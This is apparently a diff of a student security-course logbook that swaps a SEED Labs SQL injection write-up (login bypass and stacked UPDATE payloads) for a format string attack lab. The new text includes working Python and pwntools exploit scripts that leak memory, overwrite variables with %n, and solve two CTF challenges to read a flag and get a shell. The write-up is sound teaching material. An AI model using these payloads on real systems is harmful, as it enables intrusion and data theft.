@@ -2,164 +2,288 @@
 
 <br>
 
-# SEED Labs - SQL Injection Attack Lab
+# SEED Labs - Format String Attack Lab
 
 ## Preparation
 
 To prepare our systems for this lab, we followed the Environment Setup section of the guide:
 
-1. Add the entry `10.9.0.5        www.seed-server.com` to the `/etc/hosts` file of your VM.
+1. Turn off address space randomization for the stack and the heap.
+   - Execute `sudo sysctl -w kernel.randomize_va_space=0`
+   - This command instructs the kernel to stop randomizing the starting addresses of the stack and the heap. This is necessary for this lab because it makes the address at which our shellcode will be located more predictable.
 
-2. Launch the web server, using `dcup`.
-   - This command must be executed in the `Labsetup` directory.
+2. Compile the 32-bit version of the vulnerable program.
+   - The program is located in the `Labsetup/server-code` folder.
+   - It can be built with the required flags (`-static` for static compilation, `-m32` for 32-bit executables and `-z execstack` to allow the stack to be executable).
 
-<br>
+3. Copy the `format-32` executable to the `Labsetup/fmt-containers` folder.
+   - This can be done by running `make install` in the `server-code` folder.
 
-## Task 1 : Get Familiar with SQL Statements
+4. Prepare the container environment.
+   - In the `Labsetup` folder, build the container images using `dcbuild`.
 
-The goal of this task is to understand the structure of the database that is being used by the web server in the next tasks.
-
-1. Get a shell on the MySQL container.
-
-   1. Use `dockps | grep mysql` to get the id of the container (first column).
-   2. Run `docksh <id>` with the id obtained in the previous step (only the first few characters may be used).
-
-2. Get a shell inside the database, by executing `mysql -u root -pdees`.
-   
-<figure>
-   <img src="images/logbook7/task1/1.png" alt="Getting a shell on the MySQL container" width="50%" />
-   <figcaption><strong>Fig 1. </strong>Getting a shell on the MySQL container</figcaption>
-</figure>
-
-3. In the database shell:
-   
-   1. Run `use sqllab_users;` to change the current database to the database named `sqllab_users`.
-   2. Run `show tables;` to see a list of the tables in the current database.
-   3. Run `select * from credential where name = 'Alice';` to print all of Alice's profile information.
-
-<figure>
-   <img src="images/logbook7/task1/2.png" alt="Print all of Alice's profile information" width="50%" />
-   <figcaption><strong>Fig 2. </strong>Print all of Alice's profile information</figcaption>
-</figure>
+5. Execute the required containers, using `dcup`.
 
 <br>
 
-## Task 2 : SQL Injection Attack on SELECT Statement
+## Task 1 : Crashing the Program
 
-The goal of this task is to exploit a SQL Injection vulnerability and use that to log in to an arbitrary user account.
+The goal of this task is to crash the program using the vulnerable `printf` command in the code.
 
-First, we'll inspect the code on the server. By going to `Labsetup/image-www/Code/unsafe_home.php`, we can see the code that is used for the home page, which is vulnerable to SQL Injection.
-
-We found the vulnerable SELECT statement and it's presented below:
-
-<figure>
-   <img src="images/logbook7/task2/1.png" alt="The vulnerable SELECT statement" width="50%" />
-   <figcaption><strong>Fig 3. </strong>The vulnerable SELECT statement</figcaption>
-</figure>
-
-After finding the vulnerable statement, we did the following steps:
+1. Send the string "hello" to the server using `echo hello | nc -N 10.9.0.5 9090`.
    
-1. Looking at the PHP code shown previously, we can see that both the username and the password are injectable. As such, we will use the username since it's the first one to appear in the SQL query, which makes the attack easier to perform.
+   - The `nc` (`netcat`) command binds the standard input and output to a socket that is connected to the server on port `9090`.
+   - The `-N` flag closes the socket when an EOF is sent to the input. This is done so that the connection doesn't hang indefinitely and the payload is passed on to `printf` on the server. This flag is optional since `^C` can be pressed to close the connection.
 
-3. Determine the injection payload:
+In the server logs, we can see the following:
 
-   - We want to log in with the account of the user named `admin`. We can do that by executing the query `SELECT <fields> FROM credential WHERE name = 'admin';`. In the next steps, we will show how to transform the previously shown query into this one.
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the "hello" string is sent](images/logbook6/task1/00.png) | ![Sending the "hello" string to the server](images/logbook6/task1/01.png)
+
+2. Write the payload to a file using `echo '%3$n' > payload.txt`.
+
+    - After reading the guide (Listing 1), we would assume that our exploit could be designed taking into account the fact that the `myprintf` function doesn't have any local variables. However, our testing reveals that this assumption is misleading. We used `gdb` to inspect the stack right before `printf(msg)` is called.
+    ![Stack before printf is called](images/logbook6/task1/stack.png)
+    As you can see, at offset `0008`, we have the frame pointer and, at `0004`, we have the `target` variable, even though there are no `target` variables defined in `myprintf`. The reason we suspect this happens is that a previous `printf` call used `target` and, because of that, its value had to be pushed onto the stack. Since another `printf` is going to use the `target` variable later, the compiler optimizes the code and doesn't remove it from the stack after the first `printf` that uses the `target` variable returns. 
   
-   1. We do not need the `password` field. To remove it, we can simply comment it out (put `; -- ` before it; the space is needed). This will be placed in the field that comes before `password`, which is `name`. As such, no payload is needed for the `password` field.
+    - Since we are trying to crash the program, one way to do it is to write to a write-protected section. For instance, if we try to write anything in the `.text` section, we will most likely get a segmentation fault. Analyzing the stack once again, we can see that, at offset `0012`, we have a pointer to an instruction in the `.text` section. If we try to write to this location, we should get a crash.
+
+    - The address we are trying to write to is the third [4-byte\] pointer in the stack after the pointer to the format string, so we can write to it using `%3$n`. The `%n` modifier writes the number of characters printed by `printf` to a pointer (in this case, in the `.text` section).
+
+3. Send the payload to the server using `cat payload.txt | nc -N 10.9.0.5 9090`.
    
-   2. On the `username` field, we want to select the `admin` account. Furthermore, we also want to introduce the changes described in 1., which means that we must close the string as well. Since the string is opened using `'`, we will need to close it using the same character (`'`). As such, the payload for the `name` field will be `admin'; -- `.
+4. Read the logs from the server and verify that the program has crashed.
+    
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the payload was sent to the server](images/logbook6/task1/02.png) | ![Sending the payload to the server](images/logbook6/task1/03.png)
+
+<br>
+
+## Task 2 : Printing Out the Server Program's Memory
+
+This is divided into two sub-tasks:
+
+### A. Stack Data
+
+To print out the data saved on the stack when the `printf` function is executed.
+
+1. Create a payload where the first 4 bytes are unique and easily identifiable and are followed by a large sequence of `%x` modifiers.
    
-   3. The resulting SELECT statement will be as follows:
-        ```sql
-        SELECT <fields> FROM credential WHERE name = 'admin'; -- ' and Password = '';
+    - This will be useful for determining the location of our payload in the stack. We have selected the identifier `0xABCD1234`.
+    
+    - The `%x` modifiers will print out the values in the stack in hexadecimal representation. We chose to use a sequence of 64 `%x` modifiers.
+  
+    - In our case, we created the payload with the help of a simple Python script we wrote. 
+        
+        ```python
+        #!/usr/bin/python3
+        import sys
+
+        payload = bytearray.fromhex("ABCD1234") + b" %x " * 64
+
+        # Save the format string to file
+        with open('badfile', 'wb') as f:
+            f.write(payload)
         ```
 
-### 1. SQL Injection Attack from webpage
+2. Send the payload to the server, using `cat badfile | nc -N 10.9.0.5 9090`.
 
-1. Connect to the website on `www.seed-server.com`, where we will be presented with a login page.
+3. Analyze the server logs
 
-2. Fill in the login form with the following inputs:
+    - If we analyze the logs, we can easily find that there are 63 addresses before our input. Therefore, we need 64 `%x` modifiers in order to see the start of our input.
 
-    - Username: `admin'; -- `
-    - Password: *anything you want*
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the payload was sent to the server](images/logbook6/task2/00.png) | ![Sending the payload to the server](images/logbook6/task2/01.png)
 
-<figure>
-   <img src="images/logbook7/task2/web/1.png" alt="The payload for the SQL Injection attack" width="50%" />
-   <figcaption><strong>Fig 4. </strong>The payload for the SQL Injection attack</figcaption>
-</figure>
-   
-3. Submit the form.
-   
-<figure>
-   <img src="images/logbook7/task2/web/2.png" alt="Logged in as admin, with SQL Injection" width="50%" />
-   <figcaption><strong>Fig 5. </strong>Logged in as admin, with SQL Injection</figcaption>
-</figure>
+### B. Heap Data
 
-### 2. SQL Injection Attack from command line
+1. Write the payload to get the secret message
 
-`curl` is a command-line tool that allows the user to make HTTP requests to any URL. We can, therefore, send our SQL injection payload by using `curl`.
+    - We know the address of the secret message because of the following log message:
+  
+      `server-10.9.0.5 | The secret message's address:  0x080b4008`
 
-1. Open a terminal.
-2. Run `curl "www.seed-server.com/unsafe_home.php?username=admin%27;%20--%20"`.
-   
-   - Some special characters, such as `'` and spaces need to be encoded when used in a URL. As such, we must use `%20` instead of spaces and `%27` instead of single quotes, which are the corresponding URL-encoded version of those characters.
-   
-<figure>
-   <img src="images/logbook7/task2/curl/1.png" alt="First part of the output of curl" width="50%" />
-   <img src="images/logbook7/task2/curl/2.png" alt="Second part of the output of curl" width="50%" />
-   <figcaption><strong>Figs 6 and 7. </strong>HTML code of admin page, with SQL Injection and curl</figcaption>
-</figure>
+    - We also know that, if we write a sequence of bytes at the start of the file, it will get it in the 64th position on the stack.
+    
+    - We also know that the `%s` modifier takes a `char*` and prints the string in the given location.
+  
+    - Combining these two pieces of information, we can write the address of the message to the start of the buffer and use `%64$s` to read the string at the location specified by the 64th pointer in the stack (controlled by us).
+    
+    - In our case, we created the payload with the help of a simple Python script we wrote. 
+
+        ```python
+        #!/usr/bin/python3
+        import sys
+
+        payload = (0x080b4008).to_bytes(4, byteorder='little') + b"\n%64$s"
+
+        # Save the format string to file
+        with open('badfile', 'wb') as f:
+            f.write(payload)
+        ```
+
+2. Send the payload to the server, using `cat badfile | nc -N 10.9.0.5 9090`.
+
+3. Analyze the server logs
+
+    - As you can see, the "A secret message" string was printed out to the terminal.
+
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the payload was sent to the server](images/logbook6/task2/02.png) | ![Sending the payload to the server](images/logbook6/task2/03.png)
 
 <br>
 
-### 3. Append a new SQL statement
+## Task 3 : Modifying the Server Program’s Memory
 
-To execute multiple statements, we can simply add the new statement after the `;` and before the ` -- ` in the username.
+The goal of this task is to use the vulnerable `printf` function to modify the `target` global variable.
 
-As such, if we want to change Ted's salary to 1234, we will need to execute the statement `UPDATE credential SET salary = 1234 WHERE name = 'Ted';`.
+This is divided into two sub-tasks:
 
-This means that the payload will be as follows:
+### A. Change the value to a different value
 
-- Username: `admin'; UPDATE credential SET salary = 1234 WHERE name = 'Ted'; -- `
-- Password: *anything you want*
+1. Write the payload to change the `target` variable.
 
-If we submit this payload on the webpage, however, we will get an error.
+    - We want to change the value of the `target` value. The only way to write to memory with `printf` is using the `%n` modifier, which takes a pointer and writes the number of characters that were printed by `printf` to the location pointed to by that variable. Therefore, we also need the address we are going to write to.
+  
+    - Inspecting the server logs, we can see the following log message:
 
-<figure>
-   <img src="images/logbook7/task2/multistatement/1.png" alt="Error after submitting the previous payload" width="50%" />
-   <figcaption><strong>Fig 8. </strong>Error after submitting the previous payload</figcaption>
-</figure>
+        `server-10.9.0.5 | The target variable's address: 0x080e5068`
 
-This error happens because the server is configured to only execute a single statement per query. To change this, we will need to edit the `unsafe_home.php` file, as shown below.
+    - With this information, we can apply the same strategy as in the previous task, using `%64$n` instead of the `%64$s` sequence.
 
-<figure>
-   <img src="images/logbook7/task2/multistatement/2.png" alt="Code after changes have been applied" width="50%" />
-   <figcaption><strong>Fig 9. </strong>Code after changes have been applied (lines 75 - 78)</figcaption>
-</figure>
+    - In our case, we created the payload with the help of a simple Python script we wrote. 
 
-With these changes, the server stops using
-```php
-$conn->query($sql);
+        ```python
+        #!/usr/bin/python3
+        import sys
+        payload = (0x080e5068).to_bytes(4, byteorder='little') + b"%64$n"
+
+        # Save the format string to file
+        with open('badfile', 'wb') as f:
+            f.write(payload)
+        ```
+
+2. Send the payload to the server, using `cat badfile | nc -N 10.9.0.5 9090`.
+
+3. Analyze the server logs
+
+    - As you can see, the `target` variable now has a value of `0x00000004`.
+
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the payload was sent to the server](images/logbook6/task3/00.png) | ![Sending the payload to the server](images/logbook6/task3/01.png)
+
+### B. Change the value to 0x5000
+
+1. Write the payload to change the `target` variable.
+  
+    - As explained previously, the `%n` modifier writes the number of characters printed by `printf` to memory. Therefore, if we want to write the value `0x5000`, `20480` in decimal base, to `target`, we need to print that same number of characters first.
+
+    - However, at the start of the buffer, we need to place the address of `target`, which will result in 4 characters being printed (1 for each byte of the address).
+
+    - Therefore, we need to print an additional `20480 - 4 = 20476` characters, after `target`'s address.
+
+    - To accomplish that objective, we can add padding to the conversion specifications. To add padding to a specification, `%x` for instance, we can write `%<padding>x` where `<padding>` is the length of the output of that same specification. For instance, `printf("%5d", 1)` will print `"    1"`, with a length of 5.
+
+    - In our case, we created the payload with the help of a simple Python script we wrote. 
+
+        ```python
+        #!/usr/bin/python3
+        import sys
+
+        payload = (0x080e5068).to_bytes(4, byteorder='little') + b"%20476x" + b"%64$n"
+
+        # Save the format string to file
+        with open('badfile', 'wb') as f:
+            f.write(payload)
+        ```
+
+2. Send the payload to the server, using `cat badfile | nc -N 10.9.0.5 9090`.
+
+3. Analyze the server logs
+
+    - As you can see, the `target` variable now has a value of `0x00005000`.
+
+
+Terminal 1 | Terminal 2
+:---------:|:---------:
+![Server logs after the payload was sent to the server](images/logbook6/task3/02.png) | ![Sending the payload to the server](images/logbook6/task3/03.png)
+
+<br>
+<br>
+<br>
+
+# CTF
+
+## CTF - Desafio 1
+
 ```
-and instead uses
-```php
-$conn->multi_query($sql);
+RELRO           STACK CANARY      NX            PIE            RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols     Yes	0		2	program
 ```
 
-`multi_query` allows the execution of multiple semicolon-separated statements in the same query, whereas `query` doesn't.
+This program has a *Partial RELRO*, so we know that we won't be able to do a buffer overflow. Also, there is a *stack canary*, so there are low chances of having a stack smash. *NX* is enabled, so the stack isn't executable and we can't make a jump to a custom shellcode. There is no *PIE*.
 
-With these changes applied, we need to rebuild the server using `dcup --build`.
+After seeing the code, we've noticed a code segment vulnerable to format string attack:
 
-After the server is back online, if we submit the payload again, the same user details are shown. This happens because the SELECT statement comes before the UPDATE statement, which means that the changes won't be reflected on the SELECT statement.
+```c
+    scanf("%32s", &buffer);
+    printf("You gave me this: ");
+    printf(buffer);
+```
 
-To fix this, we can simply reload the page, which will in turn execute the query again and return the updated user details, as shown below.
+Watching this, we know that the printf is vulnerable to format strings and even better, that we control its input.
 
-<figure>
-   <img src="images/logbook7/task2/multistatement/3.png" alt="User details after resubmitting the SQL Injection payload" width="50%" />
-   <figcaption><strong>Fig 10. </strong>User details after resubmitting the SQL Injection payload</figcaption>
-</figure>
+We have also noticed that the flag is being loaded into a global variable `flag`, so, we can easily use GDB to find its address, by doing `p &flag`.
 
-As we can see, Ted's salary has been changed to 1234.
+![CTF Challenge 1](/images/logbook6/00.png)
 
-## Task 3 : SQL Injection Attack on UPDATE Statement
+- In contrary to SEED Labs, we didn't need to calculate the offset, because we got our input imediatly:
 
+```bash
+❯ echo "ABCDE %s" | nc ctf-fsi.fe.up.pt 4004
+Try to unlock the flag.
+Show me what you got:You gave me this: ABCDE
+Disqualified!
+```
+
+Now that we know the address of `flag`, we can build our payload:
+
+```python
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4004)
+
+payload = (0x804c060).to_bytes(4, byteorder='little') + b"%s"
+p.recvuntil(b"got:")
+p.sendline(payload)
+p.interactive()
+```
+
+## CTF - Desafio 2
+
+This challenge is similar to the first one, but with some changes.
+In this challenge, instead of just reading the value of a global variable, you have to change its value to `0xbeef` to get a shell.
+
+In this task, we cannot write directly 48879 (beef in decimal) to the address. Firstly, we have to write the global variable's address `0x0804c034`, which was found with gdb like in the previous challenge address to the payload, as in the previous examples and then, as the address are 4 Bytes, we write 48879 - 4 = `48875 Bytes`.
+
+Also, by reading `man 3 printf`, we know that in printf, `%n` is a special string formatter that instead of displaying something, loads the number of character that have been printed before itself to the variable pointed by the argument (which, in this case is our address).
+
+```python
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4005)
+
+payload = (0x0804c034).to_bytes(4, byteorder='little') + b"%48875x" + b"%1$n"
+p.recvuntil(b"here...")
+p.sendline(payload)
+p.interactive()
+```
+
+![CTF Challenge 2](/images/logbook6/01.png)
+
+Note: The notation `%<n>$d` is just the same as applying the string formatter to the n-th value, but in a less exhaustive way.  
